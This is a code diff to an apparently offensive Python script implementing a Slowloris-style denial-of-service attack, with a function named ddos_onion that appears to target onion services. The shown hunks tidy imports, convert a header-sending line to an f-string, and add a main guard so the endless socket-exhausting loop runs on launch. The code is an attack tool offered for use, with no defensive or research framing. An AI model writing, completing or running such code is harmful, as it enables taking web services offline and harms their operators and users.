@@ -1,8 +1,9 @@
- import socket
+import socket
 import ssl
 import random
 import logging
 from argparse import ArgumentParser
+import time
 
 DEFAULT_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/5.3",
@@ -40,7 +41,7 @@ def slowloris_iteration(list_of_sockets):
 
     for s in list(list_of_sockets):
         try:
-            send_line(s, "X-a: {}".format(random.randint(1, 5000)), identity)
+            send_line(s, f"X-a: {random.randint(1, 5000)}", identity)
         except socket.error:
             list_of_sockets.remove(s)
 
@@ -74,3 +75,6 @@ def ddos_onion():
 
     while True:
         slowloris_iteration(list_of_sockets)
+
+if __name__ == "__main__":
+    ddos_onion()
